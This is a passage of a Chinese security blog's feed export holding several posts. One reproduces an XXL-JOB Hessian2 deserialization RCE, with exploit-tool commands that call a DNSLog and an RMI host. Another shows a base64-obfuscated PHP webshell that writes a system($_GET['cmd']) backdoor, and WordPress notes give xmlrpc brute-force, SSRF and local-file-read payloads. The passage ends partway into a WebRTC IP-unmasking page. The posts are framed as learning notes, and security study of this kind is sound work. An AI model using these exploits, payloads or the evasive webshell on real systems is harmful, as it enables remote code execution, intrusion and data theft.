href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_local_infile" target="_blank" rel="noopener"><code>local_infile</code></a>也可以在运行时设置。</li></ul></li><li><p>在客户端：</p><ul><li><p>该<strong>CMake的</strong>选项控制编译默认的MySQL客户端库能力（见 <a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html" target="_blank" rel="noopener">MySQL源代码的配置选项</a>）。因此，未进行明确安排的客户端将 根据MySQL构建时指定的设置禁用或启用功能 。 <a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> <code>LOCAL`</code>LOCAL<code>[</code>ENABLED_LOCAL_INFILE`](<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile</a>)</p></li><li><p>默认情况下，MySQL二进制发行版中的客户端库在<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> 启用时进行编译 。如果从源代码编译MySQL，请<a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile" target="_blank" rel="noopener"><code>ENABLED_LOCAL_INFILE</code></a> 根据未进行显式安排的客户端应<code>LOCAL</code> 禁用还是启用功能，将其配置为禁用或启用。</p></li><li><p>对于使用C API的客户端程序，本地数据加载功能由编译到MySQL客户端库中的默认值决定。要显式启用或禁用它，请调用<a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html" target="_blank" rel="noopener"><code>mysql_options()</code></a> C API函数以禁用或启用该 <code>MYSQL_OPT_LOCAL_INFILE</code>选项。参见 <a href="https://dev.mysql.com/doc/c-api/5.7/en/mysql-options.html" target="_blank" rel="noopener">mysql_options（）</a>。</p></li><li><p>对于<strong>mysql</strong>客户端，本地数据加载能力由编译到MySQL客户端库中的默认值决定。要显式禁用或启用它，请使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile" target="_blank" rel="noopener"><code>--local-infile=0</code></a>或 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-command-options.html#option_mysql_local-infile" target="_blank" rel="noopener"><code>--local-infile[=1\]</code></a>选项。</p></li><li><p>对于<strong>mysqlimport</strong>客户端，默认情况下不使用本地数据加载。要显式禁用或启用它，请使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local" target="_blank" rel="noopener"><code>--local=0</code></a>或 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysqlimport.html#option_mysqlimport_local" target="_blank" rel="noopener"><code>--local[=1\]</code></a>选项。</p></li><li><p>如果<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>在Perl脚本或其他<code>[client]</code>从选项文件中读取该组的程序中使用，则可以向该组添加 <code>local-infile</code>选项设置。为防止不理解此选项的程序出现问题，请使用<a href="https://dev.mysql.com/doc/refman/5.7/en/option-modifiers.html" target="_blank" rel="noopener"><code>loose-</code></a> 前缀指定它 ：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;     [client]</span><br><span class="line">&gt;     loose-local-infile=0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote><blockquote><pre><code>或者：<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;     [client]</span><br><span class="line">&gt;     loose-local-infile=1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></code></pre></blockquote><blockquote><ul><li>在所有情况下，<code>LOCAL</code> 客户端成功使用加载操作还需要服务器允许本地加载。</li></ul><p>如果<code>LOCAL</code>禁用了此功能，则在服务器或客户端上，尝试发出<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="noopener"><code>LOAD DATA LOCAL</code></a>语句的客户端都会 收到以下错误消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ERROR 1148: The used command is not allowed with this MySQL version</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="0x02-MySQL蜜罐"><a href="#0x02-MySQL蜜罐" class="headerlink" title="0x02 MySQL蜜罐"></a>0x02 MySQL蜜罐</h2><p>利用该漏洞可以制作MySQL蜜罐来诱使攻击者连接，从而窃取攻击者主机上的敏感信息。GitHub上已有可以读取攻击者微信ID的MySQL蜜罐，具体参见：<a href="https://github.com/qigpig/MysqlHoneypot" target="_blank" rel="noopener">https://github.com/qigpig/MysqlHoneypot</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MySQL" scheme="https://www.mi1k7ea.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>XXL-JOB Hessian2反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/</id>
    <published>2021-04-22T09:24:12.000Z</published>
    <updated>2021-04-23T04:25:47.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习。</p><p>参考：<a href="https://xz.aliyun.com/t/8456" target="_blank" rel="noopener">xxl-job api未授权Hessian2反序列化</a></p><h2 id="0x01-XXL-JOB-Hessian2反序列化漏洞"><a href="#0x01-XXL-JOB-Hessian2反序列化漏洞" class="headerlink" title="0x01 XXL-JOB Hessian2反序列化漏洞"></a>0x01 XXL-JOB Hessian2反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>XXL-JOB &lt;= 2.0.2</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>XXL-JOB在2.0.2及以下版本中的接口存在未授权访问漏洞，该接口会进行Hessian2反序列化操作，导致存在Hessian2反序列化漏洞从而RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>未授权访问API探测：<code>/xxl-job-admin/api</code></p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/1.png" alt=""></p><p>启动恶意JNDI注入利用服务（工具地址：<a href="https://github.com/welk1n/JNDI-Injection-Exploit），这里打DNSLog验证：" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit），这里打DNSLog验证：</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C <span class="string">"curl xxljob.7phxqp.dnslog.cn"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/2.png" alt=""></p><p>利用最新版marshalsec的Hessian2这个Gadget来生成payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi:<span class="comment">//x.x.x.x:1099/ic9mnr &gt; xxl.ser</span></span><br></pre></td></tr></table></figure><p>在Burp中，使用”Paste from file”选项从文件中直接复制Hessian2序列化内容到POST的body中，发送攻击报文，如下响应内容即无序列化内容的格式问题：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/3.png" alt=""></p><p>恶意RMI服务端接受到请求：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/4.png" alt=""></p><p>打到DNSLog：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/5.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞版本代码：<a href="https://github.com/xuxueli/xxl-job/releases/tag/2.0.2" target="_blank" rel="noopener">https://github.com/xuxueli/xxl-job/releases/tag/2.0.2</a></p><p>看到对应存在未授权访问漏洞的API即<code>/xxl-job-admin/api</code>，代码位于<code>com/xxl/job/admin/controller/JobApiController.java</code>，其中注解PermessionLimit中limit的值为false即并没有限制权限：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/6.png" alt=""></p><p>往下看，会对请求中读取到的字节码进行反序列化操作：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/7.png" alt=""></p><p>上述的deserialize()函数是抽象类Serializer的函数，具体的还得”Ctrl+Alt+B”查看该抽象类的具体实现类中对应的重写后的方法，这里找到有HessianSerializer的：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/8.png" alt=""></p><p>其中就是Hessian2反序列化操作了：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/9.png" alt=""></p><p>前面出现了好几个抽象类deserialize()函数的实现类，怎么会偏偏是Hessian2的呢？</p><p>看到XXL-JOB的动态调度器中查看，位于<code>com/xxl/job/admin/core/schedule/XxlJobDynamicScheduler.java</code>，这里的启动的时候即调用start()函数时会调用initRpcProvider()函数，而该函数在初始化RPC Provider时明确指定了XmlRpcProviderFactory的序列化器为Hessian2的：</p><p><img src="/2021/04/22/XXL-JOB-Hessian2反序列化漏洞/10.png" alt=""></p><p>至此，OK。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="XXL-JOB" scheme="https://www.mi1k7ea.com/tags/XXL-JOB/"/>
    
  </entry>
  
  <entry>
    <title>通过spl_autoload_register实现PHP免杀WebShell</title>
    <link href="https://www.mi1k7ea.com/2021/04/21/%E9%80%9A%E8%BF%87spl-autoload-register%E5%AE%9E%E7%8E%B0PHP%E5%85%8D%E6%9D%80WebShell/"/>
    <id>https://www.mi1k7ea.com/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/</id>
    <published>2021-04-21T14:46:25.000Z</published>
    <updated>2021-05-29T07:58:17.292Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考自：<a href="https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw</a></p><h2 id="0x01-spl-autoload-register-函数"><a href="#0x01-spl-autoload-register-函数" class="headerlink" title="0x01 spl_autoload_register()函数"></a>0x01 spl_autoload_register()函数</h2><p>SPL是Standard PHP Library(标准PHP库)的缩写。它是PHP5引入的一个扩展库，其主要功能包括autoload机制的实现及包括各种Iterator接口或类。 SPL autoload机制的实现是通过将函数指针autoload_func指向自己实现的具有自动装载功能的函数来实现的。</p><p>spl_autoload_register()函数：注册给定的函数作为<code>__autoload</code>的实现。<strong>当尝试加载未定义的类时，就会调用SPL __autoload中注册的函数</strong>。</p><p>支持版本：PHP 5 &gt;= 5.1.0, PHP 7</p><p>函数定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register ( callable $autoload_function = ? , bool $throw = <span class="keyword">true</span> , bool $prepend = <span class="keyword">false</span> ) : bool</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><p>autoload_function：欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()。</p></li><li><p>throw：此参数设置了 autoload_function 无法成功注册时， spl_autoload_register()是否抛出异常。</p></li><li><p>prepend：如果是 true，spl_autoload_register() 会添加函数到队列之首，而不是队列尾部。</p></li></ul><h2 id="0x02-免杀WebShell"><a href="#0x02-免杀WebShell" class="headerlink" title="0x02 免杀WebShell"></a>0x02 免杀WebShell</h2><p>Demo代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class_name)</span></span>&#123;</span><br><span class="line">    file_put_contents(base64_decode(<span class="string">"YWFh"</span>), base64_decode(<span class="string">'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'aaa'</span>);</span><br><span class="line"><span class="keyword">new</span> aaa();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一次访问：</p><ol><li>先调用spl_autoload_register()函数注册一个<code>__autoload</code>的匿名函数，其中将<code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code>（第二个Base64编码内容）内容写入名为aaa（第一个Base64编码内容）的文件中，注意这一步只是注册了这个匿名函数、并未执行函数中的代码逻辑；</li><li>包含aaa文件进来，但由于文件不存在因此报错；</li><li>新建一个aaa类实例，因为aaa类不存在，因此会去调用第一步中注册的匿名函数，其中将一句话木马写入了aaa文件中；</li></ol><p><img src="/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/1.png" alt=""></p><p>第二次访问，由于aaa文件已生成，成功包含该文件进而getshell（这里找不到aaa类的错误无需关注）：</p><p><img src="/2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
      <category term="WebShell" scheme="https://www.mi1k7ea.com/tags/WebShell/"/>
    
  </entry>
  
  <entry>
    <title>WordPress渗透测试</title>
    <link href="https://www.mi1k7ea.com/2021/04/21/WordPress%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://www.mi1k7ea.com/2021/04/21/WordPress渗透测试/</id>
    <published>2021-04-21T02:03:48.000Z</published>
    <updated>2021-04-21T02:45:48.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>个人笔记。</p><h2 id="0x01-WPScan"><a href="#0x01-WPScan" class="headerlink" title="0x01 WPScan"></a>0x01 WPScan</h2><p>Kali中自带：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wpscan --proxy protocol://ip:port --url http://a.com/</span><br></pre></td></tr></table></figure><h2 id="0x02-xmlrpc-php"><a href="#0x02-xmlrpc-php" class="headerlink" title="0x02 xmlrpc.php"></a>0x02 xmlrpc.php</h2><h3 id="探测方法"><a href="#探测方法" class="headerlink" title="探测方法"></a>探测方法</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="暴破账号"><a href="#暴破账号" class="headerlink" title="暴破账号"></a>暴破账号</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>前提是WP版本 &lt;= 3.5.1。如果高于该版本只能DNSLog验证，也能用于向其他机子发起DoS攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://127.0.0.1:80<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://localhost/wordpress/?p=1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果目标IP和端口存在，则响应包中的<code>&lt;value&gt;&lt;int&gt;</code>中的值大于0。</p><p>利用脚本：<a href="https://github.com/FireFart/WordpressPingbackPortScanner" target="_blank" rel="noopener">https://github.com/FireFart/WordpressPingbackPortScanner</a></p><p>除了端口扫描外，还能结合file://协议来读取本地文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>file:///var/log/apache2/access_log<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://localhost/wordpress/?p=1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
      <category term="WordPress" scheme="https://www.mi1k7ea.com/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>通过WebRTC获取代理池中攻击者真实IP</title>
    <link href="https://www.mi1k7ea.com/2021/04/20/%E9%80%9A%E8%BF%87WebRTC%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86%E6%B1%A0%E4%B8%AD%E6%94%BB%E5%87%BB%E8%80%85%E7%9C%9F%E5%AE%9EIP/"/>
    <id>https://www.mi1k7ea.com/2021/04/20/通过WebRTC获取代理池中攻击者真实IP/</id>
    <published>2021-04-20T15:06:35.000Z</published>
    <updated>2021-05-29T07:58:08.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考学蚁致用的文章：<a href="https://mp.weixin.qq.com/s/qEEO-1lyFbYS7Saa2L-n0A" target="_blank" rel="noopener">【热剩饭】获取代理池背后攻击者的真实IP</a></p><h2 id="0x01-WebRTC"><a href="#0x01-WebRTC" class="headerlink" title="0x01 WebRTC"></a>0x01 WebRTC</h2><p>WebRTC (Web Real-Time Communications) 是一项实时通讯技术，它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点（Peer-to-Peer）的连接，实现视频流和（或）音频流或者其他任意数据的传输。WebRTC包含的这些标准使用户在无需安装任何插件或者第三方的软件的情况下，创建点对点（Peer-to-Peer）的数据分享和电话会议成为可能。</p><p>WebRTC支持发送UDP请求。</p><p>WebRTC相关API参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API</a></p><h2 id="0x02-通过WebRTC获取代理池中攻击者真实IP"><a href="#0x02-通过WebRTC获取代理池中攻击者真实IP" class="headerlink" title="0x02 通过WebRTC获取代理池中攻击者真实IP"></a>0x02 通过WebRTC获取代理池中攻击者真实IP</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>攻击者一般都喜欢使用Socks5类型的代理池来隐藏自己的真实IP。Socks5协议本身是支持UDP协议的，但是大多数的代理客户端并没有去实现。</p><p>因此，如果攻击者使用的Socks5类型代理只是转发所有的TCP请求而不支持UDP请求，那么就可以在网页上发起一个UDP请求从而获取到攻击者的真实出口IP。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>WebRTC支持UDP协议，而且在大多数浏览器中都是默认开启的。</p><p>即使Socks5代理支持UDP协议，但是WebRTC并不会走代理，因为其设计之初就是为了点对点通信。</p><p>webrtc.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        Remote Addr: <span class="meta">&lt;?</span>=$_SERVER[<span class="string">'REMOTE_ADDR'</span>]<span class="meta">?&gt;</span></span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;h3&gt;WebRTC&lt;/h3&gt;</span><br><span class="line">        &lt;h4&gt;Your local IP addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"localip"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;h4&gt;Your <span class="keyword">public</span> IP addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"publicip"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;h4&gt;Your IPv6 addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"ipv6"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;iframe id=<span class="string">"rtc_iframe"</span> sandbox=<span class="string">"allow-same-origin"</span> style=<span class="string">"display: none"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            <span class="comment">//get the IP addresses associated with an account</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">getIPs</span><span class="params">(callback)</span></span>&#123;</span><br><span class="line">                <span class="keyword">var</span> ip_dups = &#123;&#125;;</span><br><span class="line">                <span class="comment">//compatibility for firefox and chrome</span></span><br><span class="line">                <span class="keyword">var</span> RTCPeerConnection = window.RTCPeerConnection</span><br><span class="line">                    || window.mozRTCPeerConnection</span><br><span class="line">                    || window.msRTCPeerConnection</span><br><span class="line">                    || 